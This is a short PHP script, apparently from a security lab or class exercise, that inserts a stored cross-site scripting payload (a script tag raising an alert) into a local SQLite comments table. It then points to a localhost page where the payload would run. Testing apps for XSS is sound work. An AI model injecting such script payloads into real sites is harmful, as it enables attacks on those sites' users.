<?php
$db = new SQLite3(dirname(__FILE__) . '/private/database.db');

$xss_payload = '<script>alert("XSS Attack!");</script>';
$playerId = 3;
$userId = 2;

$stmt = $db->prepare('INSERT INTO comments (playerId, userId, body) VALUES (:playerId, :userId, :body)');
$stmt->bindValue(':playerId', $playerId, SQLITE3_INTEGER);
$stmt->bindValue(':userId', $userId, SQLITE3_INTEGER);
$stmt->bindValue(':body', $xss_payload, SQLITE3_TEXT);
$stmt->execute();

echo "Comentario XSS insertado correctamente.\n";
echo "Ahora accede a: http://localhost:3000/web/show_comments.php?id=3\n";
?>
